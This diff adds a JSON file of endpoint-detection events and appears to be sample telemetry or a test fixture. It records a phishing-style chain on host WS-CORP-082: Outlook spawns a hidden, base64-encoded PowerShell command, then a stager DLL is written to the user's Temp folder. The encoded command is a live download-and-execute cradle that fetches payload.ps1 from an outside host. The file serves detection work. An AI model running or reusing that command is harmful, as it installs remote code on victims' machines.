@@ -1,0 +1,28 @@
+{
+  "host": "WS-CORP-082",
+  "domain": "corp-acme.internal",
+  "events": [
+    {
+      "timestamp": "2026-10-09T14:24:10Z",
+      "event_name": "PROCESS_CREATION",
+      "category": "EXECUTION",
+      "severity": "HIGH",
+      "user": "jdoe",
+      "process_name": "powershell.exe",
+      "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwBsAG8AZwBpAG4ALQBwAG8AcgB0AGEAbAAuAGEAdQB0AGgALQB0AG8AawBlAG4ALQB2AGUAcgBpAGYAeQAuAG4AZQB0AC8AcABheWxvYWQucHMxIikA",
+      "parent_process": "OUTLOOK.EXE",
+      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "description": "Base64-encoded PowerShell child process spawned by email client OUTLOOK.EXE"
+    },
+    {
+      "timestamp": "2026-10-09T14:24:15Z",
+      "event_name": "FILE_WRITTEN",
+      "category": "EXECUTION",
+      "severity": "MEDIUM",
+      "user": "jdoe",
+      "file_path": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\update_stage.dll",
+      "sha256": "4a5e1e4baab89f3a32518a88c31bc87f618f76673e2cc77ab2127b7afdeda33b",
+      "description": "Stager payload written to local user Temp directory"
+    }
+  ]
+}
